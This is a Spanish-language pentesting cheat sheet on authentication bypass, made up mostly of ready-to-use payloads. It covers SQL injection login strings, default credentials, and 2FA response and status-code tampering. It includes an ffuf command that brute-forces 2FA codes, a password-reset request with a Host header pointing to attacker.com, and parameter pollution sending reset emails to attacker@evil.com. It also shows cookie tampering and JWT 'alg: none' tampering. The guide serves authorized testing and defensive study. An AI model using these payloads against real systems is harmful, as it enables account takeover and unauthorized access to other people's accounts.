# 🔐 Guía de referencia de evasión de autenticación

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗   ██╗████████╗██╗  ██╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ███████║██║   ██║   ██║   ███████║    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██╔══██║██║   ██║   ██║   ██╔══██║    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ██║  ██║╚██████╔╝   ██║   ██║  ██║    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
```

---

## 🔍 Técnicas de evasión del inicio de sesión

### Inyección SQL
```sql
admin'--
admin' #
' OR '1'='1
' OR 1=1--
") OR ("1"="1
```

### Credenciales predeterminadas
```
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
```

### Manipulación de parámetros
```http
# Cambiar el tipo de usuario
user_type=admin
role=administrator
isAdmin=true
admin=1

# Omitir la verificación
verified=true
mfa_verified=true
```

---

## 🔑 Evasión de 2FA/MFA

2FA significa autenticación de dos factores y MFA, autenticación multifactor.

> **Interpretación:** cambiar una respuesta o su código HTTP en el navegador no modifica por sí solo la sesión del servidor. La evasión solo se confirma si el servidor permite acceder a recursos protegidos sin completar los factores requeridos. Véase la [explicación de PortSwigger sobre MFA](https://portswigger.net/web-security/authentication/multi-factor).

### Manipulación de respuestas
```http
# Cambiar false por true
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

### Manipulación del código de estado
```http
# Si es 401/403, probar a cambiarlo por 200
# Usar un proxy para modificar la respuesta
```

### Navegación directa
```http
# Tras iniciar sesión, omitir la página de 2FA
/login → /2fa → /dashboard
# Probar a acceder directamente a /dashboard
```

### Fuerza bruta del código
```bash
# Códigos de 4 dígitos
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

### Reutilización de códigos
```http
# Probar códigos antiguos o caducados
# Probar el mismo código varias veces
```

### Valores nulos o vacíos
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

---

## 🔓 Evasión del restablecimiento de contraseña

### Inyección en la cabecera Host
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

### Manipulación de tokens
```http
# Tokens predecibles
token=1
token=admin
token=base64(user_id)

# Reutilización de tokens
# Usar el token propio de restablecimiento con el correo de la víctima
```

### Contaminación de parámetros
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

### Manipulación de respuestas
```json
// Buscar el token en la respuesta
{"token": "abc123", "email": "victim@target.com"}
```

---

## 🛡️ Evasión mediante sesiones y cookies

### Manipulación de cookies
```http
# Cambiar valores
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

### Manipulación de JWT

> **Precisión:** `alg` pertenece a la cabecera JOSE; `role` es un claim del payload. Editarlos no conserva una firma válida. El ejemplo presupone una validación criptográfica defectuosa o una aceptación indebida de tokens sin firma. Véase [RFC 8725](https://www.rfc-editor.org/rfc/rfc8725.html).
```json
// Cambiar claims (afirmaciones del token)
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

### Fijación de sesión

> **Condición necesaria:** el servidor debe aceptar el identificador conocido por el atacante y mantenerlo tras el inicio de sesión de la víctima; cambiar una cookie local de forma aislada no demuestra fijación de sesión.
```http
# Asignar la sesión del atacante a la víctima
# La víctima inicia sesión con el ID de sesión del atacante
```

---

## 📊 Referencia rápida

| Tipo de evasión | Técnica |
|-------------|-----------|
| Inicio de sesión | SQLi y credenciales predeterminadas |
| 2FA | Manipulación de respuestas y fuerza bruta |
| Restablecimiento de contraseña | Cabecera Host y reutilización de tokens |
| Sesión | Manipulación de cookies y JWT |

### Puntos vulnerables habituales
```
- Formularios de acceso
- Flujos de restablecimiento de contraseña
- Implementaciones de 2FA/MFA
- Funciones para recordar la sesión
- Verificación de cuentas
- Implementaciones de OAuth
```

---

## 📚 Recursos

- [Autenticación de PortSwigger](https://portswigger.net/web-security/authentication)
- [Evasión de autenticación de HackTricks](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)

---

<p align="center">
  <b>🔐 ¡Explora los fallos de autenticación!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
